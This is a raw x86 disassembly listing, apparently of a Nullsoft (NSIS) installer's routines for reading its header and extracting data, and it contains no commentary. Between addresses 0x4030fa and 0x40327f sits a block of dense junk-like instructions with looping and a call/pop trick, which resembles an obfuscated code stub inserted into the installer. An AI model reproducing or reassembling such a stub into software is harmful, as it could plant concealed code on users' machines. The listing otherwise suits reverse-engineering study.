  402bb3:	e8 f3 26 00 00       	call   0x4052ab
  402bb8:	33 c0                	xor    %eax,%eax
  402bba:	c9                   	leave
  402bbb:	c2 10 00             	ret    $0x10
  402bbe:	56                   	push   %esi
  402bbf:	33 f6                	xor    %esi,%esi
  402bc1:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402bc5:	74 18                	je     0x402bdf
  402bc7:	a1 88 0b 42 00       	mov    0x420b88,%eax
  402bcc:	3b c6                	cmp    %esi,%eax
  402bce:	74 07                	je     0x402bd7
  402bd0:	50                   	push   %eax
  402bd1:	ff 15 e8 71 40 00    	call   *0x4071e8
  402bd7:	89 35 88 0b 42 00    	mov    %esi,0x420b88
  402bdd:	5e                   	pop    %esi
  402bde:	c3                   	ret
  402bdf:	39 35 88 0b 42 00    	cmp    %esi,0x420b88
  402be5:	74 08                	je     0x402bef
  402be7:	56                   	push   %esi
  402be8:	e8 7a 31 00 00       	call   0x405d67
  402bed:	5e                   	pop    %esi
  402bee:	c3                   	ret
  402bef:	ff 15 8c 70 40 00    	call   *0x40708c
  402bf5:	3b 05 6c eb 42 00    	cmp    0x42eb6c,%eax
  402bfb:	76 23                	jbe    0x402c20
  402bfd:	56                   	push   %esi
  402bfe:	68 3b 2b 40 00       	push   $0x402b3b
  402c03:	56                   	push   %esi
  402c04:	6a 6f                	push   $0x6f
  402c06:	ff 35 60 eb 42 00    	push   0x42eb60
  402c0c:	ff 15 ec 71 40 00    	call   *0x4071ec
  402c12:	6a 05                	push   $0x5
  402c14:	50                   	push   %eax
  402c15:	a3 88 0b 42 00       	mov    %eax,0x420b88
  402c1a:	ff 15 60 72 40 00    	call   *0x407260
  402c20:	5e                   	pop    %esi
  402c21:	c3                   	ret
  402c22:	55                   	push   %ebp
  402c23:	8b ec                	mov    %esp,%ebp
  402c25:	83 ec 28             	sub    $0x28,%esp
  402c28:	53                   	push   %ebx
  402c29:	56                   	push   %esi
  402c2a:	33 db                	xor    %ebx,%ebx
  402c2c:	57                   	push   %edi
  402c2d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402c30:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402c33:	ff 15 8c 70 40 00    	call   *0x40708c
  402c39:	be 00 5c 43 00       	mov    $0x435c00,%esi
  402c3e:	68 00 04 00 00       	push   $0x400
  402c43:	05 e8 03 00 00       	add    $0x3e8,%eax
  402c48:	56                   	push   %esi
  402c49:	53                   	push   %ebx
  402c4a:	a3 6c eb 42 00       	mov    %eax,0x42eb6c
  402c4f:	ff 15 94 70 40 00    	call   *0x407094
  402c55:	6a 03                	push   $0x3
  402c57:	68 00 00 00 80       	push   $0x80000000
  402c5c:	56                   	push   %esi
  402c5d:	e8 81 2a 00 00       	call   0x4056e3
  402c62:	8b f8                	mov    %eax,%edi
  402c64:	83 ff ff             	cmp    $0xffffffff,%edi
  402c67:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402c6a:	89 3d 14 90 40 00    	mov    %edi,0x409014
  402c70:	75 0a                	jne    0x402c7c
  402c72:	b8 04 91 40 00       	mov    $0x409104,%eax
  402c77:	e9 d8 01 00 00       	jmp    0x402e54
  402c7c:	56                   	push   %esi
  402c7d:	be 00 4c 43 00       	mov    $0x434c00,%esi
  402c82:	56                   	push   %esi
  402c83:	e8 84 2d 00 00       	call   0x405a0c
  402c88:	56                   	push   %esi
  402c89:	e8 b8 28 00 00       	call   0x405546
  402c8e:	50                   	push   %eax
  402c8f:	68 00 60 43 00       	push   $0x436000
  402c94:	e8 73 2d 00 00       	call   0x405a0c
  402c99:	53                   	push   %ebx
  402c9a:	57                   	push   %edi
  402c9b:	ff 15 90 70 40 00    	call   *0x407090
  402ca1:	3b c3                	cmp    %ebx,%eax
  402ca3:	a3 90 8b 42 00       	mov    %eax,0x428b90
  402ca8:	8b f0                	mov    %eax,%esi
  402caa:	0f 8e e7 00 00 00    	jle    0x402d97
  402cb0:	bb 90 0b 42 00       	mov    $0x420b90,%ebx
  402cb5:	a1 74 eb 42 00       	mov    0x42eb74,%eax
  402cba:	8b fe                	mov    %esi,%edi
  402cbc:	f7 d8                	neg    %eax
  402cbe:	1b c0                	sbb    %eax,%eax
  402cc0:	25 00 7e 00 00       	and    $0x7e00,%eax
  402cc5:	05 00 02 00 00       	add    $0x200,%eax
  402cca:	3b f0                	cmp    %eax,%esi
  402ccc:	7c 02                	jl     0x402cd0
  402cce:	8b f8                	mov    %eax,%edi
  402cd0:	57                   	push   %edi
  402cd1:	53                   	push   %ebx
  402cd2:	e8 a6 03 00 00       	call   0x40307d
  402cd7:	85 c0                	test   %eax,%eax
  402cd9:	0f 84 22 01 00 00    	je     0x402e01
  402cdf:	83 3d 74 eb 42 00 00 	cmpl   $0x0,0x42eb74
  402ce6:	75 7a                	jne    0x402d62
  402ce8:	6a 1c                	push   $0x1c
  402cea:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402ced:	53                   	push   %ebx
  402cee:	50                   	push   %eax
  402cef:	e8 b0 29 00 00       	call   0x4056a4
  402cf4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402cf7:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402cfc:	75 72                	jne    0x402d70
  402cfe:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  402d05:	75 69                	jne    0x402d70
  402d07:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  402d0e:	75 60                	jne    0x402d70
  402d10:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  402d17:	75 57                	jne    0x402d70
  402d19:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  402d20:	75 4e                	jne    0x402d70
  402d22:	09 45 08             	or     %eax,0x8(%ebp)
  402d25:	8b 45 08             	mov    0x8(%ebp),%eax
  402d28:	8b 0d 80 4b 41 00    	mov    0x414b80,%ecx
  402d2e:	83 e0 02             	and    $0x2,%eax
  402d31:	09 05 00 ec 42 00    	or     %eax,0x42ec00
  402d37:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d3a:	3b c6                	cmp    %esi,%eax
  402d3c:	89 0d 74 eb 42 00    	mov    %ecx,0x42eb74
  402d42:	0f 8f b2 00 00 00    	jg     0x402dfa
  402d48:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402d4c:	75 06                	jne    0x402d54
  402d4e:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402d52:	75 41                	jne    0x402d95
  402d54:	ff 45 fc             	incl   -0x4(%ebp)
  402d57:	8d 70 fc             	lea    -0x4(%eax),%esi
  402d5a:	3b fe                	cmp    %esi,%edi
  402d5c:	76 12                	jbe    0x402d70
  402d5e:	8b fe                	mov    %esi,%edi
  402d60:	eb 0e                	jmp    0x402d70
  402d62:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402d66:	75 08                	jne    0x402d70
  402d68:	6a 00                	push   $0x0
  402d6a:	e8 4f fe ff ff       	call   0x402bbe
  402d6f:	59                   	pop    %ecx
  402d70:	3b 35 90 8b 42 00    	cmp    0x428b90,%esi
  402d76:	7d 0d                	jge    0x402d85
  402d78:	57                   	push   %edi
  402d79:	53                   	push   %ebx
  402d7a:	ff 75 f8             	push   -0x8(%ebp)
  402d7d:	e8 18 30 00 00       	call   0x405d9a
  402d82:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402d85:	01 3d 80 4b 41 00    	add    %edi,0x414b80
  402d8b:	2b f7                	sub    %edi,%esi
  402d8d:	85 f6                	test   %esi,%esi
  402d8f:	0f 8f 20 ff ff ff    	jg     0x402cb5
  402d95:	33 db                	xor    %ebx,%ebx
  402d97:	6a 01                	push   $0x1
  402d99:	e8 20 fe ff ff       	call   0x402bbe
  402d9e:	39 1d 74 eb 42 00    	cmp    %ebx,0x42eb74
  402da4:	59                   	pop    %ecx
  402da5:	74 53                	je     0x402dfa
  402da7:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  402daa:	74 22                	je     0x402dce
  402dac:	ff 35 80 4b 41 00    	push   0x414b80
  402db2:	e8 f8 02 00 00       	call   0x4030af
  402db7:	8d 45 08             	lea    0x8(%ebp),%eax
  402dba:	6a 04                	push   $0x4
  402dbc:	50                   	push   %eax
  402dbd:	e8 bb 02 00 00       	call   0x40307d
  402dc2:	85 c0                	test   %eax,%eax
  402dc4:	74 34                	je     0x402dfa
  402dc6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402dc9:	3b 45 08             	cmp    0x8(%ebp),%eax
  402dcc:	75 2c                	jne    0x402dfa
  402dce:	ff 75 ec             	push   -0x14(%ebp)
  402dd1:	6a 40                	push   $0x40
  402dd3:	ff 15 00 71 40 00    	call   *0x407100
  402dd9:	8b f0                	mov    %eax,%esi
  402ddb:	a1 74 eb 42 00       	mov    0x42eb74,%eax
  402de0:	83 c0 1c             	add    $0x1c,%eax
  402de3:	50                   	push   %eax
  402de4:	e8 c6 02 00 00       	call   0x4030af
  402de9:	ff 75 ec             	push   -0x14(%ebp)
  402dec:	56                   	push   %esi
  402ded:	53                   	push   %ebx
  402dee:	6a ff                	push   $0xffffffff
  402df0:	e8 66 00 00 00       	call   0x402e5b
  402df5:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  402df8:	74 11                	je     0x402e0b
  402dfa:	b8 38 90 40 00       	mov    $0x409038,%eax
  402dff:	eb 53                	jmp    0x402e54
  402e01:	6a 01                	push   $0x1
  402e03:	e8 b6 fd ff ff       	call   0x402bbe
  402e08:	59                   	pop    %ecx
  402e09:	eb ef                	jmp    0x402dfa
  402e0b:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  402e0f:	89 35 70 eb 42 00    	mov    %esi,0x42eb70
  402e15:	8b 06                	mov    (%esi),%eax
  402e17:	a3 78 eb 42 00       	mov    %eax,0x42eb78
  402e1c:	74 06                	je     0x402e24
  402e1e:	ff 05 7c eb 42 00    	incl   0x42eb7c
  402e24:	6a 08                	push   $0x8
  402e26:	8d 46 44             	lea    0x44(%esi),%eax
  402e29:	59                   	pop    %ecx
  402e2a:	83 e8 08             	sub    $0x8,%eax
  402e2d:	01 30                	add    %esi,(%eax)
  402e2f:	49                   	dec    %ecx
  402e30:	75 f8                	jne    0x402e2a
  402e32:	6a 01                	push   $0x1
  402e34:	53                   	push   %ebx
  402e35:	53                   	push   %ebx
  402e36:	ff 75 f4             	push   -0xc(%ebp)
  402e39:	ff 15 34 71 40 00    	call   *0x407134
  402e3f:	89 46 3c             	mov    %eax,0x3c(%esi)
  402e42:	83 c6 04             	add    $0x4,%esi
  402e45:	6a 40                	push   $0x40
  402e47:	56                   	push   %esi
  402e48:	68 80 eb 42 00       	push   $0x42eb80
  402e4d:	e8 52 28 00 00       	call   0x4056a4
  402e52:	33 c0                	xor    %eax,%eax
  402e54:	5f                   	pop    %edi
  402e55:	5e                   	pop    %esi
  402e56:	5b                   	pop    %ebx
  402e57:	c9                   	leave
  402e58:	c2 04 00             	ret    $0x4
  402e5b:	55                   	push   %ebp
  402e5c:	8b ec                	mov    %esp,%ebp
  402e5e:	83 ec 58             	sub    $0x58,%esp
  402e61:	53                   	push   %ebx
  402e62:	56                   	push   %esi
  402e63:	8b 75 14             	mov    0x14(%ebp),%esi
  402e66:	57                   	push   %edi
  402e67:	8b 7d 10             	mov    0x10(%ebp),%edi
  402e6a:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402e6d:	85 ff                	test   %edi,%edi
  402e6f:	75 07                	jne    0x402e78
  402e71:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  402e78:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402e7c:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402e7f:	85 ff                	test   %edi,%edi
  402e81:	75 07                	jne    0x402e8a
  402e83:	c7 45 f4 88 8b 41 00 	movl   $0x418b88,-0xc(%ebp)
  402e8a:	8b 45 08             	mov    0x8(%ebp),%eax
  402e8d:	85 c0                	test   %eax,%eax
  402e8f:	7c 0e                	jl     0x402e9f
  402e91:	8b 0d b8 eb 42 00    	mov    0x42ebb8,%ecx
  402e97:	03 c8                	add    %eax,%ecx
  402e99:	51                   	push   %ecx
  402e9a:	e8 10 02 00 00       	call   0x4030af
  402e9f:	8d 45 14             	lea    0x14(%ebp),%eax
  402ea2:	6a 04                	push   $0x4
  402ea4:	50                   	push   %eax
  402ea5:	e8 d3 01 00 00       	call   0x40307d
  402eaa:	85 c0                	test   %eax,%eax
  402eac:	0f 84 76 01 00 00    	je     0x403028
  402eb2:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  402eb6:	0f 84 55 01 00 00    	je     0x403011
  402ebc:	8b 1d 8c 70 40 00    	mov    0x40708c,%ebx
  402ec2:	ff d3                	call   *%ebx
  402ec4:	83 25 ec b4 40 00 00 	andl   $0x0,0x40b4ec
  402ecb:	83 25 e8 b4 40 00 00 	andl   $0x0,0x40b4e8
  402ed2:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  402ed9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402edc:	b8 70 cb 40 00       	mov    $0x40cb70,%eax
  402ee1:	c7 05 d0 af 40 00 08 	movl   $0x8,0x40afd0
  402ee8:	00 00 00 
  402eeb:	a3 78 4b 41 00       	mov    %eax,0x414b78
  402ef0:	a3 74 4b 41 00       	mov    %eax,0x414b74
  402ef5:	8b 45 14             	mov    0x14(%ebp),%eax
  402ef8:	c7 05 70 4b 41 00 70 	movl   $0x414b70,0x414b70
  402eff:	4b 41 00 
  402f02:	89 45 08             	mov    %eax,0x8(%ebp)
  402f05:	0f 8e 68 01 00 00    	jle    0x403073
  402f0b:	be 00 40 00 00       	mov    $0x4000,%esi
  402f10:	39 75 14             	cmp    %esi,0x14(%ebp)
  402f13:	7d 03                	jge    0x402f18
  402f15:	8b 75 14             	mov    0x14(%ebp),%esi
  402f18:	bf 88 4b 41 00       	mov    $0x414b88,%edi
  402f1d:	56                   	push   %esi
  402f1e:	57                   	push   %edi
  402f1f:	e8 59 01 00 00       	call   0x40307d
  402f24:	85 c0                	test   %eax,%eax
  402f26:	0f 84 fc 00 00 00    	je     0x403028
  402f2c:	29 75 14             	sub    %esi,0x14(%ebp)
  402f2f:	89 3d c0 af 40 00    	mov    %edi,0x40afc0
  402f35:	89 35 c4 af 40 00    	mov    %esi,0x40afc4
  402f3b:	8b 7d f4             	mov    -0xc(%ebp),%edi
  402f3e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f41:	68 c0 af 40 00       	push   $0x40afc0
  402f46:	89 3d c8 af 40 00    	mov    %edi,0x40afc8
  402f4c:	a3 cc af 40 00       	mov    %eax,0x40afcc
  402f51:	e8 b2 2e 00 00       	call   0x405e08
  402f56:	85 c0                	test   %eax,%eax
  402f58:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402f5b:	0f 8c a8 00 00 00    	jl     0x403009
  402f61:	8b 35 c8 af 40 00    	mov    0x40afc8,%esi
  402f67:	2b f7                	sub    %edi,%esi
  402f69:	ff d3                	call   *%ebx
  402f6b:	f6 05 14 ec 42 00 01 	testb  $0x1,0x42ec14
  402f72:	8b f8                	mov    %eax,%edi
  402f74:	74 43                	je     0x402fb9
  402f76:	2b 45 f0             	sub    -0x10(%ebp),%eax
  402f79:	3d c8 00 00 00       	cmp    $0xc8,%eax
  402f7e:	77 06                	ja     0x402f86
  402f80:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  402f84:	75 33                	jne    0x402fb9
  402f86:	8b 45 08             	mov    0x8(%ebp),%eax
  402f89:	ff 75 08             	push   0x8(%ebp)
  402f8c:	2b 45 14             	sub    0x14(%ebp),%eax
  402f8f:	6a 64                	push   $0x64
  402f91:	50                   	push   %eax
  402f92:	ff 15 30 71 40 00    	call   *0x407130
  402f98:	50                   	push   %eax
  402f99:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402f9c:	68 20 91 40 00       	push   $0x409120
  402fa1:	50                   	push   %eax
  402fa2:	ff 15 00 72 40 00    	call   *0x407200
  402fa8:	83 c4 0c             	add    $0xc,%esp
  402fab:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402fae:	50                   	push   %eax
  402faf:	6a 00                	push   $0x0
  402fb1:	e8 f4 1d 00 00       	call   0x404daa
  402fb6:	89 7d f0             	mov    %edi,-0x10(%ebp)
  402fb9:	33 c0                	xor    %eax,%eax
  402fbb:	3b f0                	cmp    %eax,%esi
  402fbd:	74 3f                	je     0x402ffe
  402fbf:	39 45 10             	cmp    %eax,0x10(%ebp)
  402fc2:	75 20                	jne    0x402fe4
  402fc4:	50                   	push   %eax
  402fc5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402fc8:	50                   	push   %eax
  402fc9:	56                   	push   %esi
  402fca:	ff 75 f4             	push   -0xc(%ebp)
  402fcd:	ff 75 0c             	push   0xc(%ebp)
  402fd0:	ff 15 28 71 40 00    	call   *0x407128
  402fd6:	85 c0                	test   %eax,%eax
  402fd8:	74 33                	je     0x40300d
  402fda:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  402fdd:	75 2e                	jne    0x40300d
  402fdf:	01 75 fc             	add    %esi,-0x4(%ebp)
  402fe2:	eb 0e                	jmp    0x402ff2
  402fe4:	a1 c8 af 40 00       	mov    0x40afc8,%eax
  402fe9:	01 75 fc             	add    %esi,-0x4(%ebp)
  402fec:	29 75 f8             	sub    %esi,-0x8(%ebp)
  402fef:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402ff2:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  402ff6:	0f 85 3f ff ff ff    	jne    0x402f3b
  402ffc:	eb 75                	jmp    0x403073
  402ffe:	39 45 14             	cmp    %eax,0x14(%ebp)
  403001:	0f 8f 04 ff ff ff    	jg     0x402f0b
  403007:	eb 6a                	jmp    0x403073
  403009:	6a fc                	push   $0xfffffffc
  40300b:	eb 1d                	jmp    0x40302a
  40300d:	6a fe                	push   $0xfffffffe
  40300f:	eb 19                	jmp    0x40302a
  403011:	85 ff                	test   %edi,%edi
  403013:	74 53                	je     0x403068
  403015:	39 75 14             	cmp    %esi,0x14(%ebp)
  403018:	7d 03                	jge    0x40301d
  40301a:	8b 75 14             	mov    0x14(%ebp),%esi
  40301d:	56                   	push   %esi
  40301e:	57                   	push   %edi
  40301f:	e8 59 00 00 00       	call   0x40307d
  403024:	85 c0                	test   %eax,%eax
  403026:	75 48                	jne    0x403070
  403028:	6a fd                	push   $0xfffffffd
  40302a:	58                   	pop    %eax
  40302b:	eb 49                	jmp    0x403076
  40302d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403030:	39 75 14             	cmp    %esi,0x14(%ebp)
  403033:	7d 03                	jge    0x403038
  403035:	8b 75 14             	mov    0x14(%ebp),%esi
  403038:	bf 88 4b 41 00       	mov    $0x414b88,%edi
  40303d:	56                   	push   %esi
  40303e:	57                   	push   %edi
  40303f:	e8 39 00 00 00       	call   0x40307d
  403044:	85 c0                	test   %eax,%eax
  403046:	74 e0                	je     0x403028
  403048:	8d 45 10             	lea    0x10(%ebp),%eax
  40304b:	6a 00                	push   $0x0
  40304d:	50                   	push   %eax
  40304e:	56                   	push   %esi
  40304f:	57                   	push   %edi
  403050:	ff 75 0c             	push   0xc(%ebp)
  403053:	ff 15 28 71 40 00    	call   *0x407128
  403059:	85 c0                	test   %eax,%eax
  40305b:	74 b0                	je     0x40300d
  40305d:	3b 75 10             	cmp    0x10(%ebp),%esi
  403060:	75 ab                	jne    0x40300d
  403062:	01 75 fc             	add    %esi,-0x4(%ebp)
  403065:	29 75 14             	sub    %esi,0x14(%ebp)
  403068:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40306c:	7f bf                	jg     0x40302d
  40306e:	eb 03                	jmp    0x403073
  403070:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403073:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403076:	5f                   	pop    %edi
  403077:	5e                   	pop    %esi
  403078:	5b                   	pop    %ebx
  403079:	c9                   	leave
  40307a:	c2 10 00             	ret    $0x10
  40307d:	55                   	push   %ebp
  40307e:	8b ec                	mov    %esp,%ebp
  403080:	56                   	push   %esi
  403081:	8b 75 0c             	mov    0xc(%ebp),%esi
  403084:	8d 45 0c             	lea    0xc(%ebp),%eax
  403087:	6a 00                	push   $0x0
  403089:	50                   	push   %eax
  40308a:	56                   	push   %esi
  40308b:	ff 75 08             	push   0x8(%ebp)
  40308e:	ff 35 14 90 40 00    	push   0x409014
  403094:	ff 15 2c 71 40 00    	call   *0x40712c
  40309a:	85 c0                	test   %eax,%eax
  40309c:	74 0a                	je     0x4030a8
  40309e:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4030a1:	75 05                	jne    0x4030a8
  4030a3:	33 c0                	xor    %eax,%eax
  4030a5:	40                   	inc    %eax
  4030a6:	eb 02                	jmp    0x4030aa
  4030a8:	33 c0                	xor    %eax,%eax
  4030aa:	5e                   	pop    %esi
  4030ab:	5d                   	pop    %ebp
  4030ac:	c2 08 00             	ret    $0x8
  4030af:	6a 00                	push   $0x0
  4030b1:	6a 00                	push   $0x0
  4030b3:	ff 74 24 0c          	push   0xc(%esp)
  4030b7:	ff 35 14 90 40 00    	push   0x409014
  4030bd:	ff 15 34 71 40 00    	call   *0x407134
  4030c3:	c2 04 00             	ret    $0x4
  4030c6:	56                   	push   %esi
  4030c7:	be 00 54 43 00       	mov    $0x435400,%esi
  4030cc:	56                   	push   %esi
  4030cd:	e8 9c 2b 00 00       	call   0x405c6e
  4030d2:	56                   	push   %esi
  4030d3:	e8 94 24 00 00       	call   0x40556c
  4030d8:	85 c0                	test   %eax,%eax
  4030da:	75 02                	jne    0x4030de
  4030dc:	5e                   	pop    %esi
  4030dd:	c3                   	ret
  4030de:	56                   	push   %esi
  4030df:	e8 1b 24 00 00       	call   0x4054ff
  4030e4:	6a 00                	push   $0x0
  4030e6:	56                   	push   %esi
  4030e7:	ff 15 80 70 40 00    	call   *0x407080
  4030ed:	56                   	push   %esi
  4030ee:	68 00 50 43 00       	push   $0x435000
  4030f3:	e8 1a 26 00 00       	call   0x405712
  4030f8:	5e                   	pop    %esi
  4030f9:	c3                   	ret
  4030fa:	88 e7                	mov    %ah,%bh
  4030fc:	85 f5                	test   %esi,%ebp
  4030fe:	0c 31                	or     $0x31,%al
  403100:	f2 8a c6             	repnz mov %dh,%al
  403103:	85 d6                	test   %edx,%esi
  403105:	39 e8                	cmp    %ebp,%eax
  403107:	f6 c3 d7             	test   $0xd7,%bl
  40310a:	f7 c7 8b c7 86 ab    	test   $0xab86c78b,%edi
  403110:	4d                   	dec    %ebp
  403111:	f6 c5 68             	test   $0x68,%ch
  403114:	e8 3c 00 00 00       	call   0x403155
  403119:	b9 00 00 00 00       	mov    $0x0,%ecx
  40311e:	8d 15 54 ba 19 10    	lea    0x1019ba54,%edx
  403124:	80 c4 53             	add    $0x53,%ah
  403127:	f2 4d                	repnz dec %ebp
  403129:	fe ca                	dec    %dl
  40312b:	f2 81 c1 ad 02 00 00 	repnz add $0x2ad,%ecx
  403132:	21 ef                	and    %ebp,%edi
  403134:	81 e9 ac 02 00 00    	sub    $0x2ac,%ecx
  40313a:	8b d0                	mov    %eax,%edx
  40313c:	69 db 2f c8 f1 5b    	imul   $0x5bf1c82f,%ebx,%ebx
  403142:	86 f7                	xchg   %dh,%bh
  403144:	34 47                	xor    $0x47,%al
  403146:	0f b6 d8             	movzbl %al,%ebx
  403149:	81 f9 f8 06 00 00    	cmp    $0x6f8,%ecx
  40314f:	0f 82 c9 ff ff ff    	jb     0x40311e
  403155:	5f                   	pop    %edi
  403156:	8d 15 43 3d bc 1f    	lea    0x1fbc3d43,%edx
  40315c:	f7 c6 d2 38 58 cb    	test   $0xcb5838d2,%esi
  403162:	53                   	push   %ebx
  403163:	c6 c5 2b             	mov    $0x2b,%ch
  403166:	0f af c5             	imul   %ebp,%eax
  403169:	49                   	dec    %ecx
  40316a:	f6 c5 a4             	test   $0xa4,%ch
  40316d:	b6 c7                	mov    $0xc7,%dh
  40316f:	33 d2                	xor    %edx,%edx
  403171:	41                   	inc    %ecx
  403172:	28 e3                	sub    %ah,%bl
  403174:	85 e9                	test   %ebp,%ecx
  403176:	72 06                	jb     0x40317e
  403178:	69 dd ad 04 e4 5f    	imul   $0x5fe404ad,%ebp,%ebx
  40317e:	0f be c8             	movsbl %al,%ecx
  403181:	80 ef 67             	sub    $0x67,%bh
  403184:	81 c2 5c 5c 0a 00    	add    $0xa5c5c,%edx
  40318a:	43                   	inc    %ebx
  40318b:	1c 27                	sbb    $0x27,%al
  40318d:	69 d9 16 28 94 e1    	imul   $0xe1942816,%ecx,%ebx
  403193:	81 ea 5b 5c 0a 00    	sub    $0xa5c5b,%edx
  403199:	2c 12                	sub    $0x12,%al
  40319b:	30 d7                	xor    %dl,%bh
  40319d:	87 c5                	xchg   %eax,%ebp
  40319f:	0c 48                	or     $0x48,%al
  4031a1:	85 da                	test   %ebx,%edx
  4031a3:	81 fa c1 05 00 00    	cmp    $0x5c1,%edx
  4031a9:	0f 86 c2 ff ff ff    	jbe    0x403171
  4031af:	0f b7 c9             	movzwl %cx,%ecx
  4031b2:	3c fe                	cmp    $0xfe,%al
  4031b4:	c7 c3 91 53 4f bb    	mov    $0xbb4f5391,%ebx
  4031ba:	0f af eb             	imul   %ebx,%ebp
  4031bd:	f2 69 c8 a0 c6 16 76 	repnz imul $0x7616c6a0,%eax,%ecx
  4031c4:	8d 05 4a 30 85 ec    	lea    0xec85304a,%eax
  4031ca:	b4 82                	mov    $0x82,%ah
  4031cc:	86 eb                	xchg   %ch,%bl
  4031ce:	0f af de             	imul   %esi,%ebx
  4031d1:	88 e7                	mov    %ah,%bh
  4031d3:	b5 63                	mov    $0x63,%ch
  4031d5:	0f b7 cb             	movzwl %bx,%ecx
  4031d8:	80 ef 52             	sub    $0x52,%bh
  4031db:	81 c7 e9 4f 06 00    	add    $0x64fe9,%edi
  4031e1:	00 cd                	add    %cl,%ch
  4031e3:	8a ef                	mov    %bh,%ch
  4031e5:	81 c7 e8 0b 00 00    	add    $0xbe8,%edi
  4031eb:	0f b7 ee             	movzwl %si,%ebp
  4031ee:	c6 c1 7b             	mov    $0x7b,%cl
  4031f1:	32 e3                	xor    %bl,%ah
  4031f3:	68 df 3f 30 00       	push   $0x303fdf
  4031f8:	be 7d 54 3e 17       	mov    $0x173e547d,%esi
  4031fd:	69 ed b7 13 43 59    	imul   $0x594313b7,%ebp,%ebp
  403203:	11 cd                	adc    %ecx,%ebp
  403205:	3c e8                	cmp    $0xe8,%al
  403207:	73 07                	jae    0x403210
  403209:	89 f9                	mov    %edi,%ecx
  40320b:	b6 b0                	mov    $0xb0,%dh
  40320d:	80 f3 b7             	xor    $0xb7,%bl
  403210:	77 01                	ja     0x403213
  403212:	f3 85 d0             	repz test %edx,%eax
  403215:	73 04                	jae    0x40321b
  403217:	b5 b0                	mov    $0xb0,%ch
  403219:	b5 a6                	mov    $0xa6,%ch
  40321b:	bb 85 0d 03 00       	mov    $0x30d85,%ebx
  403220:	85 d2                	test   %edx,%edx
  403222:	75 06                	jne    0x40322a
  403224:	8b f0                	mov    %eax,%esi
  403226:	8b f6                	mov    %esi,%esi
  403228:	ff c5                	inc    %ebp
  40322a:	81 f3 2b e9 00 00    	xor    $0xe92b,%ebx
  403230:	c6 c6 0a             	mov    $0xa,%dh
  403233:	85 c9                	test   %ecx,%ecx
  403235:	81 eb 90 ef 03 00    	sub    $0x3ef90,%ebx
  40323b:	2b c8                	sub    %eax,%ecx
  40323d:	21 fe                	and    %edi,%esi
  40323f:	53                   	push   %ebx
  403240:	eb 04                	jmp    0x403246
  403242:	b2 13                	mov    $0x13,%dl
  403244:	84 ce                	test   %cl,%dh
  403246:	58                   	pop    %eax
  403247:	b9 d7 94 b9 e8       	mov    $0xe8b994d7,%ecx
  40324c:	05 09 0f 00 00       	add    $0xf09,%eax
  403251:	48                   	dec    %eax
  403252:	80 cf be             	or     $0xbe,%bh
  403255:	69 d2 60 92 e5 57    	imul   $0x57e59260,%edx,%edx
  40325b:	f3 ff c6             	repz inc %esi
  40325e:	76 05                	jbe    0x403265
  403260:	0f af f1             	imul   %ecx,%esi
  403263:	85 dd                	test   %ebx,%ebp
  403265:	3d 12 01 00 00       	cmp    $0x112,%eax
  40326a:	0f 87 e1 ff ff ff    	ja     0x403251
  403270:	0b ca                	or     %edx,%ecx
  403272:	3b ce                	cmp    %esi,%ecx
  403274:	0f af db             	imul   %ebx,%ebx
  403277:	b6 26                	mov    $0x26,%dh
  403279:	57                   	push   %edi
  40327a:	87 d8                	xchg   %ebx,%eax
  40327c:	0f be dd             	movsbl %ch,%ebx
  40327f:	c3                   	ret
  403280:	65 39 1d 7c eb 42 00 	cmp    %ebx,%gs:0x42eb7c
  403287:	74 4d                	je     0x4032d6
  403289:	53                   	push   %ebx
  40328a:	57                   	push   %edi
  40328b:	e8 9a 22 00 00       	call   0x40552a
  403290:	8b f0                	mov    %eax,%esi
  403292:	eb 09                	jmp    0x40329d
  403294:	81 3e 20 5f 3f 3d    	cmpl   $0x3d3f5f20,(%esi)
  40329a:	74 05                	je     0x4032a1
  40329c:	4e                   	dec    %esi
  40329d:	3b f7                	cmp    %edi,%esi
  40329f:	73 f3                	jae    0x403294
  4032a1:	3b f7                	cmp    %edi,%esi
  4032a3:	c7 44 24 10 04 91 40 	movl   $0x409104,0x10(%esp)
  4032aa:	00 
  4032ab:	72 64                	jb     0x403311
  4032ad:	88 1e                	mov    %bl,(%esi)
  4032af:	83 c6 04             	add    $0x4,%esi
  4032b2:	56                   	push   %esi
